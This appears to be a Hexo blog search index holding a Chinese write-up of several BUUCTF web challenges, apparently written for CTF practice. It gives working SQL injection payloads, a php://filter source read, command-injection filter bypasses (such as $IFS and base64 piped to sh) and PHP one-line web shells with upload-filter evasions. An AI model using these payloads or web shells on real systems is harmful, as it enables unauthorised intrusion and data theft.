<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>BUUCTF web刷题记录 WP</title>
    <link href="/2022/03/29/buu/"/>
    <url>/2022/03/29/buu/</url>
    
    <content type="html"><![CDATA[<h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><blockquote><p><a href="https://www.cnblogs.com/gtx690/p/13176458.html">参考博客园WP1+常见sql_mode介绍</a></p><p><a href="https://blog.csdn.net/RABCDXB/article/details/111398725">CSDN WP2</a></p><p><a href="http://mysql.jsrun.net/">在线mysql执行🔗</a></p><p><a href="https://www.liaoxuefeng.com/wiki/1177760294764384/1179611432985088">在线mysql执行2🔗</a></p></blockquote><ul><li><span style="background:#ffbbff;"><strong>知识点：</strong></span></li></ul><pre><code class="hljs oxygene">堆叠查询后端代码猜测<span class="hljs-number">1</span> || ** ，||双作用<span class="hljs-keyword">set</span> sql_mode = pipes_as_concat 命令理解（为什么没有过滤<span class="hljs-keyword">set</span>、<span class="hljs-keyword">concat</span>的原因）</code></pre><p>万能密码’ or ‘1’=’1发现waf</p><p>尝试堆叠注入</p><p>输入query=1;select 2;返回Array ( [0] =&gt; 1 ) Array ( [0] =&gt; 2 )，</p><p>query=1;select database();返回Array ( [0] =&gt; 1 ) Array ( [0] =&gt; ctf )，得到数据库：ctf，</p><p>query=1;show tables;返回Array ( [0] =&gt; 1 ) Array ( [0] =&gt; Flag )，得到表Flag </p><ul><li><p>获取数据表结构:</p><p>desc 表名;</p><p>show columns from 表名;</p></li></ul><p>但是都被拦截，估计过滤了关键词flag</p><blockquote><p><a href="https://www.runoob.com/mysql/mysql-operator.html">mysql运算符</a></p></blockquote><p>mysq里逻辑运算符：与：and，或：or、||，非：not、！，异或：xor</p><p><strong>单个|是按位或运算符，&amp;是按位与，^是按位异或</strong></p><p>运算符优先级：</p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220126153927429.png" alt="image-20220126153927429" style="zoom: 50%;"><h3 id="双作用：或、连接"><a href="#双作用：或、连接" class="headerlink" title="||双作用：或、连接"></a>||双作用：或、连接</h3><ol><li>逻辑或</li></ol><p>本地测试</p><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-string">&#x27;a&#x27;</span>||<span class="hljs-string">&#x27;flag&#x27;</span>; //0<span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>||<span class="hljs-string">&#x27;flag&#x27;</span>; //1<span class="hljs-keyword">SELECT</span> <span class="hljs-number">0</span>||<span class="hljs-string">&#x27;flag&#x27;</span>; //0<span class="hljs-keyword">SELECT</span> <span class="hljs-number">0</span>||<span class="hljs-keyword">id</span> <span class="hljs-keyword">from</span> student;  //1 student表里有id列名<span class="hljs-keyword">SELECT</span> <span class="hljs-number">0</span>||<span class="hljs-string">&#x27;id&#x27;</span> <span class="hljs-keyword">from</span> student;  //0<span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>||<span class="hljs-string">&#x27;id&#x27;</span> <span class="hljs-keyword">from</span> student;  //1</code></pre><p>==》==逻辑或（or），只要||前后是存在的字段名或着非0的数，就判定正确==</p><ol start="2"><li>连接符，类似concat函数</li></ol><p><strong>sql_mode=pipes_as_concat</strong>：把||当成字符串连接符而非逻辑或运算，==若拼接的是列名，则会显示查询结果再拼接==</p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220126160732988.png" alt="image-20220126160732988" style="zoom:50%;"><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220126160820866.png" alt="image-20220126160820866" style="zoom:50%;"><p>猜测：</p><blockquote><p><strong>这道题目需要我们去对后端语句进行猜测，有点矛盾的地方在于其描述的功能和实际的功能似乎并不相符，==通过输入非零数字得到的回显1和输入其余字符得不到回显来判断出内部的查询语句可能存在有||==，也就是select 输入的数据||内置的一个列名 from 表名，进一步进行猜测即为select post进去的数据||flag from Flag(含有数据的表名，通过堆叠注入可知)，需要注意的是，此时的||起到的作用是or的作用</strong></p></blockquote><p>关键，执行的sql语句是</p><pre><code class="hljs arcade"><span class="hljs-symbol">$s</span>ql = <span class="hljs-string">&quot;select &quot;</span>.<span class="hljs-symbol">$post</span>[<span class="hljs-string">&#x27;query&#x27;</span>].<span class="hljs-string">&quot;||flag from Flag&quot;</span>;<span class="hljs-symbol">$s</span>ql = <span class="hljs-string">&quot;select xxx ||flag from Flag&quot;</span>;</code></pre><p>解法1：</p><p><code>*,1</code></p><pre><code class="hljs sqf"><span class="hljs-built_in">select</span> *,<span class="hljs-number">1</span> ||<span class="hljs-built_in">flag</span> <span class="hljs-keyword">from</span> <span class="hljs-built_in">Flag</span>;即<span class="hljs-built_in">select</span> *,<span class="hljs-number">1</span> <span class="hljs-keyword">from</span> <span class="hljs-built_in">Flag</span>;即查出了<span class="hljs-built_in">Flag</span>表中的所有内容+新增一列全<span class="hljs-number">1</span></code></pre><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220126163149707.png" alt="image-20220126163149707" style="zoom:80%;"><p>解法2：</p><p><code>1;set sql_mode=pipes_as_concat;select 1</code></p><pre><code class="hljs sqf"><span class="hljs-built_in">select</span> <span class="hljs-number">1</span>;<span class="hljs-built_in">set</span> sql_mode=pipes_as_concat;<span class="hljs-built_in">select</span> <span class="hljs-number">1</span> ||<span class="hljs-built_in">flag</span> <span class="hljs-keyword">from</span> <span class="hljs-built_in">Flag</span>;执行两次查询，后一次<span class="hljs-built_in">select</span> <span class="hljs-number">1</span> ||<span class="hljs-built_in">flag</span> <span class="hljs-keyword">from</span> <span class="hljs-built_in">Flag</span>;即把<span class="hljs-built_in">select</span> <span class="hljs-built_in">flag</span> <span class="hljs-keyword">from</span> <span class="hljs-built_in">Flag</span>;的结果和<span class="hljs-number">1</span>拼接生成新一列</code></pre><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220126163217854.png" alt="image-20220126163217854" style="zoom:80%;"><p><a href="http://www.xianxianlabs.com/blog/2020/05/27/355.html">源码</a>，发现也是multi_query()执行多条语句产生的漏洞</p><h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><h3 id="考点：文件包含、伪协议"><a href="#考点：文件包含、伪协议" class="headerlink" title="考点：文件包含、伪协议"></a><span style="background:#ffbbff;">考点：文件包含、伪协议</span></h3><ol><li>点击超链接跳转到Archive_room.php，点击secret超链接发现秒跳转到end.php，而不显示secret超链接的文件action.php，用burpshuite抓包，得到提示内容</li></ol><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220127161616536.png" alt="image-20220127161616536"></p><ol start="2"><li>访问secr3t.php，发现源码</li></ol><pre><code class="hljs php+HTML">&lt;html&gt;    &lt;title&gt;secret&lt;&#x2F;title&gt;    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;&lt;?php    highlight_file(__FILE__);    error_reporting(0);    $file&#x3D;$_GET[&#39;file&#39;];    if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;        echo &quot;Oh no!&quot;;        exit();    &#125;    include($file); &#x2F;&#x2F;flag放在了flag.php里?&gt;&lt;&#x2F;html&gt;</code></pre><p>文件包含，利用伪协议读取文件，发现过滤了php://input、data://，也不能用截断</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/15063209941952.png" alt="伪协议总结"></p><p>php://filter 伪协议文件包含读取源代码，加上read=convert.base64-encode，用base64编码输出，不然<strong>会直接当做php代码执行，看不到源代码内容</strong>（file=flag.php）</p><p>payload：</p><pre><code class="hljs awk">secr3t.php?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=flag.php</code></pre><p>读取flag.php源码，解密得到flag</p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220127162708933.png" alt="image-20220127162708933" style="zoom:50%;"><h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><h4 id="考点：手注字符注入"><a href="#考点：手注字符注入" class="headerlink" title="考点：手注字符注入"></a><span style="background:#ffbbff;">考点：手注字符注入</span></h4><p>输入’回显报错提示==》有字符注入</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220127164535555.png" alt="image-20220127164535555"></p><p>输入万能密码，得到提示admin+密码：f3dd35cabf06e25a413446369583a7b8，尝试登陆无果</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220127164411998.png" alt="image-20220127164411998"></p><p>‘后加#就不会报错，注释：</p><pre><code class="hljs 1c">输入框的时候用<span class="hljs-meta">#，在地址栏/hackbar的时候使用%23</span></code></pre><p>判断列数：</p><pre><code class="hljs apache"><span class="hljs-attribute">check</span>.php?username=admin&amp;password=<span class="hljs-number">1</span>&#x27;order by <span class="hljs-number">4</span>%<span class="hljs-number">23</span> //报错<span class="hljs-attribute">check</span>.php?username=admin&amp;password=<span class="hljs-number">1</span>&#x27;order by <span class="hljs-number">3</span>%<span class="hljs-number">23</span>  //不报错，说明有三列</code></pre><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220127164914313.png" alt="image-20220127164914313" style="zoom:50%;"><p>判断回显位置：</p><pre><code class="hljs apache"><span class="hljs-attribute">check</span>.php?username=admin&amp;password=<span class="hljs-number">1</span>&#x27;union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>%<span class="hljs-number">23</span>  //回显在<span class="hljs-number">2</span>，<span class="hljs-number">3</span>处</code></pre><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220127164929580.png" alt="image-20220127164929580" style="zoom:50%;"><p>爆库名</p><pre><code class="hljs lsl"><span class="hljs-number">1</span>&#x27;union select <span class="hljs-number">1</span>,database(),<span class="hljs-number">3</span>%<span class="hljs-number">23</span>  <span class="hljs-comment">//geek</span></code></pre><p>爆当前库下表名</p><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27;union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) from information_schema.tables where table_schema=database()%<span class="hljs-number">23</span>  //geekuser,l<span class="hljs-number">0</span>ve<span class="hljs-number">1</span>ysq<span class="hljs-number">1</span></code></pre><p>爆当前库下所有列名</p><pre><code class="hljs sql">1&#x27;union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()%<span class="hljs-number">23</span>  //<span class="hljs-keyword">id</span>,username,<span class="hljs-keyword">password</span>,<span class="hljs-keyword">id</span>,username,<span class="hljs-keyword">password</span></code></pre><p>爆指定库字段</p><pre><code class="hljs sql">1&#x27;union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(<span class="hljs-keyword">concat_ws</span>(<span class="hljs-string">&#x27;--&#x27;</span>,<span class="hljs-keyword">id</span>,username,<span class="hljs-keyword">password</span>)) <span class="hljs-keyword">from</span> l0ve1ysq1%<span class="hljs-number">23</span></code></pre><p>1–cl4y–wo_tai_nan_le,2–glzjin–glzjin_wants_a_girlfriend,3–Z4cHAr7zCr–biao_ge_dddd_hm,4–0xC4m3l–linux_chuang_shi_ren,5–Ayrain–a_rua_rain,6–Akko–yan_shi_fu_de_mao_bo_he,7–fouc5–cl4y,8–fouc5–di_2_kuai_fu_ji,9–fouc5–di_3_kuai_fu_ji,10–fouc5–di_4_kuai_fu_ji,11–fouc5–di_5_kuai_fu_ji,12–fouc5–di_6_kuai_fu_ji,13–fouc5–di_7_kuai_fu_ji,14–fouc5–di_8_kuai_fu_ji,15–leixiao–Syc_san_da_hacker,16–flag–flag{03addeba-bef3-4821-86bd-04c7690ea3a6}</p><p>得到flag</p><h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><h3 id="考点：命令执行、过滤绕过、变量拼接"><a href="#考点：命令执行、过滤绕过、变量拼接" class="headerlink" title="考点：命令执行、过滤绕过、变量拼接"></a>考点：命令执行、过滤绕过、变量拼接</h3><blockquote><p><a href="https://www.cnblogs.com/Cl0ud/p/12313368.html">参考WP</a></p><p><a href="https://chen.oinsm.com/2020/01/10/GXYCTF-2019-%E5%A4%8D%E7%8E%B0/">个人博客，有各种绕过过滤方法，关键词**</a></p></blockquote><ol><li>执行多条bash语句：</li></ol><pre><code class="hljs 1c">;<span class="hljs-string">|   //前面的输出作为后面的输入，被吞掉</span><span class="hljs-meta">&amp;</span></code></pre><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220130121137143.png" alt="image-20220130121137143" style="zoom: 67%;"><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220130121159304.png" alt="image-20220130121159304" style="zoom: 67%;"><ol start="2"><li>发现空格被过滤，绕过方法：</li></ol><pre><code class="hljs powershell">&#123;<span class="hljs-built_in">cat</span>,flag.txt&#125; <span class="hljs-built_in">cat</span><span class="hljs-variable">$</span>&#123;IFS&#125;flag.txt<span class="hljs-built_in">cat</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$9flag</span>.txt<span class="hljs-built_in">cat</span>&lt;flag.txt<span class="hljs-built_in">cat</span>&lt;&gt;flag.txtkg=<span class="hljs-variable">$</span><span class="hljs-string">&#x27;\x20flag.txt&#x27;</span>&amp;&amp;<span class="hljs-built_in">cat</span><span class="hljs-variable">$kg</span>(\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)</code></pre><ol start="3"><li>发现关键词flag被过滤</li></ol><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220130121238751.png" alt="image-20220130121238751" style="zoom:67%;"><p>先查看index.php<code>/?ip=127.0.0.1;cat$IFS$9index.php</code></p><p>得到index.php源码</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;ip&#x27;</span>]))&#123;  $ip = $_GET[<span class="hljs-string">&#x27;ip&#x27;</span>];  <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, $ip, $match))&#123;      <span class="hljs-comment">//$/?*&lt;&gt;&#x27;&quot;\()[]&#123;&#125;\x00-\x1f</span>    <span class="hljs-keyword">echo</span> preg_match(<span class="hljs-string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, $ip, $match);    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck your symbol!&quot;</span>);  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/ /&quot;</span>, $ip))&#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck your space!&quot;</span>);  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/bash/&quot;</span>, $ip))&#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck your bash!&quot;</span>);  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, $ip))&#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck your flag!&quot;</span>);  &#125;  $a = shell_exec(<span class="hljs-string">&quot;ping -c 4 &quot;</span>.$ip);  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>;  print_r($a);&#125;<span class="hljs-meta">?&gt;</span></code></pre><p><a href="https://www.cnblogs.com/kenshinobiy/p/4443600.html">正则相关知识：</a></p><pre><code class="hljs smalltalk">一个点‘.’可以代表所有的单一字符*紧跟的一个字符的zero or more字符‘|’相当于<span class="hljs-type">OR</span> 操作：<span class="hljs-comment">&quot;(b│cd)ef&quot;</span>: 匹配含有 <span class="hljs-comment">&quot;bef&quot;</span> 或者 <span class="hljs-comment">&quot;cdef&quot;</span>的字符串;中括号[xxx]括住的内容只匹配一个单一的字符:<span class="hljs-comment">&quot;^[a-zA-Z]&quot;</span>: 匹配以字母开头的字符串;<span class="hljs-comment">&quot;[a-d]&quot;</span>: 匹配<span class="hljs-string">&#x27;a&#x27;</span> 到<span class="hljs-string">&#x27;d&#x27;</span>的单个字符 (和<span class="hljs-comment">&quot;a│b│c│d&quot;</span> 还有 <span class="hljs-comment">&quot;[abcd]&quot;</span>效果一样);</code></pre><ol start="4"><li>==flag被过滤，绕过方法：==</li></ol><pre><code class="hljs haml">拼接绕过:a=l;b=s;$a$b编码绕过：base64：echo “Y2F0IC9mbGFn”|base64-d|bash=<span class="ruby">=&gt;cat /flag</span><span class="ruby">hex：</span><span class="ruby">echo “<span class="hljs-number">636174202</span>f666c6167” <span class="hljs-params">| xxd -r -p|</span>bash</span><span class="ruby">==&gt;cat /flag</span><span class="ruby">oct：</span><span class="ruby">$(printf “\<span class="hljs-number">154</span>\<span class="hljs-number">163</span>”)</span><span class="ruby">==&gt;ls</span></code></pre><p>payload1：变量拼接：</p><p> 在flag贪婪匹配里面我们不将flag连着写，就不会匹配到，同时可以看到有$a变量，尝试覆盖它</p><pre><code class="hljs powershell">?ip=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>;b=lag;a=f;<span class="hljs-built_in">cat</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$a</span><span class="hljs-variable">$b</span>.php?ip=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>;b=g;<span class="hljs-built_in">cat</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$9fla</span><span class="hljs-variable">$b</span>.php</code></pre><p>payload2：过滤bash，就用sh，sh的大部分脚本都可以在bash下运行。</p><pre><code class="hljs stata">bash：echo <span class="hljs-string">&quot;Y2F0IGZsYWcucGhw&quot;</span>| base64 -<span class="hljs-keyword">d</span> | bash  <span class="hljs-comment">//发现被过滤</span><span class="hljs-keyword">sh</span>：echo<span class="hljs-variable">$IFS</span><span class="hljs-variable">$1Y2F0IGZsYWcucGhw</span>|base64<span class="hljs-variable">$IFS</span><span class="hljs-variable">$1</span>-<span class="hljs-keyword">d</span>|<span class="hljs-keyword">sh</span>  <span class="hljs-comment">//成功</span>Y2F0IGZsYWcucGhw：<span class="hljs-keyword">cat</span> flag.php</code></pre><h4 id="“奇淫技巧”：内联执行"><a href="#“奇淫技巧”：内联执行" class="headerlink" title="“奇淫技巧”：内联执行"></a>“奇淫技巧”：内联执行</h4><p>内联，就是将反引号内命令的输出作为输入执行。</p><p>秒题大概就是这种做法吧……</p><p>==<strong>payload3：内联绕过，无需列出中间结果，可以一次输出多个文件内容</strong>==</p><pre><code class="hljs stata">?ip=;<span class="hljs-keyword">cat</span><span class="hljs-variable">$IFS</span>`<span class="hljs-keyword">ls</span>`</code></pre><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220130123618657.png" alt="image-20220130123618657" style="zoom:67%;"><h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><h3 id="考点：eval代码执行"><a href="#考点：eval代码执行" class="headerlink" title="考点：eval代码执行"></a>考点：eval代码执行</h3><p>eval($_POST[“Syc”]);</p><p><strong>运用eval()要注意几点:</strong></p><ul><li>eval函数的==参数的字符串末尾一定要有分号==</li><li><strong>eval()</strong> 返回 **<code>NULL</code>**，不回显，得有echo才回显</li></ul><p>payload</p><pre><code class="hljs ini"><span class="hljs-attr">Syc</span>=echo  `ls`<span class="hljs-comment">;   //看源码，发现只有index.php</span><span class="hljs-attr">Syc</span>=echo  `ls /`<span class="hljs-comment">;  //看根目录，发现flag文件</span><span class="hljs-attr">Syc</span>=echo  `cat /flag`<span class="hljs-comment">; //得到flag</span></code></pre><h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><h3 id="考http，大概率考http请求体header的用法"><a href="#考http，大概率考http请求体header的用法" class="headerlink" title="考http，大概率考http请求体header的用法"></a>考http，大概率考http请求体header的用法</h3><p>可以用burpsuite/浏览器hackbar直接加</p><ol><li>访问网站，查看源码发现跳转文件secret.php</li></ol><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220130133859973.png" alt="image-20220130133859973"></p><ol start="2"><li><p>网页显示It doesn’t come from ‘<a href="https://sycsecret.buuoj.cn&/#39;%E6%8F%90%E7%A4%BA%E4%B8%8D%E6%98%AF%E4%BB%8E%E6%9F%90%E7%BD%91%E7%AB%99%E8%B7%B3%E8%BD%AC%E8%BF%87%E6%9D%A5%E7%9A%84==%E3%80%8B%E4%BF%AE%E6%94%B9Referer:https://www.Sycsecret.com">https://Sycsecret.buuoj.cn&#39;提示不是从某网站跳转过来的==》修改Referer:https://www.Sycsecret.com</a></p></li><li><p>Please use “Syclover” browser  ==》修改User-Agent:Syclover</p></li><li><p>No!!! you can only read this locally!!!  ==》要从本地访问==》修改X-Forwarded-For:127.0.0.1</p></li></ol><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220130134240237.png" alt="image-20220130134240237"></p><h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><h3 id="考点：-lt-、图片头绕过、php可解析后缀、上传位置"><a href="#考点：-lt-、图片头绕过、php可解析后缀、上传位置" class="headerlink" title="考点：&lt;?、图片头绕过、php可解析后缀、上传位置"></a>考点：&lt;?、图片头绕过、php可解析后缀、上传位置</h3><p>查看源码，关键源码</p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;upload_file.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span>   <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">align</span>=<span class="hljs-string">&quot;center&quot;</span>&gt;</span>     <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;font:20px Georgia,serif;&quot;</span>&gt;</span>图片：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>   <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;file&quot;</span> &gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;button&quot;</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></code></pre><h4 id="html知识"><a href="#html知识" class="headerlink" title="html知识"></a>html知识</h4><p><strong><em>div标签定义 HTML 文档中的分隔（DIVision）或部分（section），表示一块</em></strong></p><p><strong><em>align是对齐属性，center：居中对齐</em></strong></p><p><strong><em>action 属性规定当提交表单时，向何处发送表单数据。</em></strong></p><p>上传文件到upload_file.php，文件表单名叫file</p><ol><li>试试上传一句话木马shell.php，发现不行，返回Not image!，前端对后缀名有限制</li></ol><pre><code class="hljs php">Content-Type: application/octet-stream<span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>($_POST[<span class="hljs-string">&#x27;shell&#x27;</span>]);<span class="hljs-meta">?&gt;</span></code></pre><ol start="2"><li><p>改成shell.php.jpg也不行，改mime:image/jpeg也不行，说明后端对文件头有限制</p></li><li><p>上传图片马，发现对&lt;?有过滤</p><ul><li><p>**==标签绕过==**：<code>&lt;script language=php&gt; eval($_POST[&#39;c&#39;]);&lt;/script&gt;</code></p></li><li><pre><code>标准标签：&lt;?php简写标签  &lt;?=    它是 &lt;?php echo 的简写形式,（无需闭合尾巴）短标记(&lt;? xxx ?&gt;)，需开启([short_open_tag](https://www.php.net/manual/zh/ini.core.php#ini.short-open-tag)in php.ini)asp标签(&lt;%xxx%&gt;)【禁用了&lt;?、 &lt;?php、 ?&gt;时】需开启（asp_tags）&lt;script language=php&gt;echo  ‘123’;&lt;/script&gt; 这里不存在&lt;?，可以绕过正则对&lt;? ,&lt;?php，asp的限制注意⚠️php&gt;7废除了asp标签和script标签<pre><code class="hljs xml">4. 成功上传shell.jpg，但怎么让他解析呢?此法不行，后面上传.htaccess也不行，必须内容是图片开头，说明还是后缀解析问题5. <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;background:#bbffff;&quot;</span>&gt;</span>**默认后缀php解析**<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></code></pre>⚠默认后缀解析phtml、pht、php3、php4和php5都是Apache和php认可的php程序的文件后缀php2, php3, php4, php5, phps, pht, phtm, phtml<pre><code class="hljs routeros">修改后缀php2，php3.。都不行**修改上传文件的类型为phtml，只有这样才能使网页后端执行我们的一句话木马**&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220213230412016.png&quot;</span> <span class="hljs-attribute">alt</span>=<span class="hljs-string">&quot;image-20220213230412016&quot;</span> <span class="hljs-attribute">style</span>=<span class="hljs-string">&quot;zoom:67%;&quot;</span> /&gt;精简版：**这题的绕过点有三个，一个就是文件内容不能有&lt;?，还有就是文件后缀的绕过，还有图片头。**</code></pre>GIF89a? &lt;script language=&quot;php&quot;&gt;eval($_POST[c])&lt;/script&gt;<pre><code class="hljs routeros">还有一个问题就是**上传之后的文件在哪**。**&lt;span <span class="hljs-attribute">style</span>=<span class="hljs-string">&quot;background:#FF9999;&quot;</span>&gt;猜测还是常规的目录/upload下面&lt;/span&gt;**&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220213230719900.png&quot;</span> <span class="hljs-attribute">alt</span>=<span class="hljs-string">&quot;image-20220213230719900&quot;</span> <span class="hljs-attribute">style</span>=<span class="hljs-string">&quot;zoom:50%;&quot;</span> /&gt;访问11.phtml失败，说明位置不对，GET访问upload/11.phtml成功，显示图片源码&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220213224630667.png&quot;</span> <span class="hljs-attribute">alt</span>=<span class="hljs-string">&quot;image-20220213224630667&quot;</span> <span class="hljs-attribute">style</span>=<span class="hljs-string">&quot;zoom: 50%;&quot;</span> /&gt;POST访问，成功&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220213224720182.png&quot;</span> <span class="hljs-attribute">alt</span>=<span class="hljs-string">&quot;image-20220213224720182&quot;</span> <span class="hljs-attribute">style</span>=<span class="hljs-string">&quot;zoom: 50%;&quot;</span> 